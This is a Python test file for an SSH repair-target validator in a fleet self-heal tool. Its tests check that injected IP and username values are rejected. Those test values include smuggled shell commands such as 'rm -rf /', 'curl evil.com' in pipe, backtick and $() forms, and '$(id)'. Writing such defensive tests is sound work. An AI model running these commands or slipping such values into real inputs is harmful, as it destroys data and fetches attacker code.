"""
Tests for SSH repair target validation — prevents command injection via fleet messages.

Tests _validate_repair_target() which guards _ssh_repair_peer() from
malicious ip/user values received over NATS.
"""

import pytest

from multifleet.self_heal import SelfHealManager


class TestValidateRepairTarget:
    """_validate_repair_target rejects dangerous ip/user values."""

    # ── Valid inputs ──

    @pytest.mark.security
    def test_valid_ip_and_user(self):
        assert SelfHealManager._validate_repair_target("192.168.1.10", "aaron") is True

    @pytest.mark.security
    def test_valid_ip_with_underscore_user(self):
        assert SelfHealManager._validate_repair_target("10.0.0.1", "fleet_user") is True

    @pytest.mark.security
    def test_valid_ip_with_hyphen_user(self):
        assert SelfHealManager._validate_repair_target("172.16.0.5", "mac-mini") is True

    # ── Empty / missing ──

    @pytest.mark.security
    def test_empty_ip_rejected(self):
        assert SelfHealManager._validate_repair_target("", "user") is False

    @pytest.mark.security
    def test_empty_user_rejected(self):
        assert SelfHealManager._validate_repair_target("192.168.1.1", "") is False

    @pytest.mark.security
    def test_both_empty_rejected(self):
        assert SelfHealManager._validate_repair_target("", "") is False

    # ── IP format attacks ──

    @pytest.mark.security
    def test_ip_with_semicolon_injection(self):
        """Attacker tries: ssh user@192.168.1.1;rm -rf / ..."""
        assert SelfHealManager._validate_repair_target("192.168.1.1;rm -rf /", "user") is False

    @pytest.mark.security
    def test_ip_with_pipe_injection(self):
        assert SelfHealManager._validate_repair_target("192.168.1.1|curl evil.com", "user") is False

    @pytest.mark.security
    def test_ip_with_backtick_injection(self):
        assert SelfHealManager._validate_repair_target("`curl evil.com`", "user") is False

    @pytest.mark.security
    def test_ip_with_dollar_injection(self):
        assert SelfHealManager._validate_repair_target("$(curl evil.com)", "user") is False

    @pytest.mark.security
    def test_ip_with_ampersand(self):
        assert SelfHealManager._validate_repair_target("192.168.1.1&echo pwned", "user") is False

    @pytest.mark.security
    def test_ip_with_newline(self):
        assert SelfHealManager._validate_repair_target("192.168.1.1\necho pwned", "user") is False

    @pytest.mark.security
    def test_ip_not_valid_format(self):
        """Hostname instead of IP — rejected."""
        assert SelfHealManager._validate_repair_target("evil.example.com", "user") is False

    @pytest.mark.security
    def test_ip_octet_out_of_range(self):
        assert SelfHealManager._validate_repair_target("192.168.1.999", "user") is False

    @pytest.mark.security
    def test_ip_too_many_octets(self):
        assert SelfHealManager._validate_repair_target("1.2.3.4.5", "user") is False

    # ── User format attacks ──

    @pytest.mark.security
    def test_user_with_semicolon(self):
        assert SelfHealManager._validate_repair_target("192.168.1.1", "user;rm -rf /") is False

    @pytest.mark.security
    def test_user_with_backtick(self):
        assert SelfHealManager._validate_repair_target("192.168.1.1", "`whoami`") is False

    @pytest.mark.security
    def test_user_with_dollar(self):
        assert SelfHealManager._validate_repair_target("192.168.1.1", "$(id)") is False

    @pytest.mark.security
    def test_user_with_quotes(self):
        assert SelfHealManager._validate_repair_target("192.168.1.1", 'user"injection') is False

    @pytest.mark.security
    def test_user_with_single_quotes(self):
        assert SelfHealManager._validate_repair_target("192.168.1.1", "user'injection") is False

    @pytest.mark.security
    def test_user_with_space(self):
        """Spaces in username could break ssh argument parsing."""
        assert SelfHealManager._validate_repair_target("192.168.1.1", "user name") is False

    @pytest.mark.security
    def test_user_too_long(self):
        """Usernames over 32 chars rejected."""
        assert SelfHealManager._validate_repair_target("192.168.1.1", "a" * 33) is False

    @pytest.mark.security
    def test_user_exactly_32_chars(self):
        assert SelfHealManager._validate_repair_target("192.168.1.1", "a" * 32) is True

    # ── Boundary IPs ──

    @pytest.mark.security
    def test_ip_all_zeros(self):
        assert SelfHealManager._validate_repair_target("0.0.0.0", "user") is True

    @pytest.mark.security
    def test_ip_max_valid(self):
        assert SelfHealManager._validate_repair_target("255.255.255.255", "user") is True

    @pytest.mark.security
    def test_ip_256_octet(self):
        assert SelfHealManager._validate_repair_target("256.1.1.1", "user") is False
